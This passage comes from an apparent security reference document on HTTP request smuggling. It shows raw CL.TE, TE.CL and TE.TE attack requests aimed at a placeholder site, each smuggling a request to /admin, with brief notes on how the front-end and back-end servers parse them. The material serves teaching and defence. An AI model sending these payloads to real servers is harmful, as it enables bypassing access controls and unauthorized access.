---
source: "common/http-smuggling.md"
title: "HTTP Request Smuggling"
heading: "Common Smuggling Techniques"
category: "common-vuln"
language: "common"
severity: "critical"
tags: [common, common-vuln, configurations, smuggling, vibe, vulnerable, what]
chunk: 4/11
---

## Common Smuggling Techniques

### CL.TE (Front-end uses Content-Length, Back-end uses Transfer-Encoding)

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
```
- **Front-end** reads `Content-Length: 13` → body is `0\r\n\r\nGET /admin...`
- **Back-end** reads `Transfer-Encoding: chunked` → `0` means body ends → treats `GET /admin` as NEW request!

### TE.CL (Front-end uses Transfer-Encoding, Back-end uses Content-Length)

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST /admin HTTP/1.1
Content-Length: 15

x=1
0
```

### TE.TE (Obfuscating Transfer-Encoding)

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
```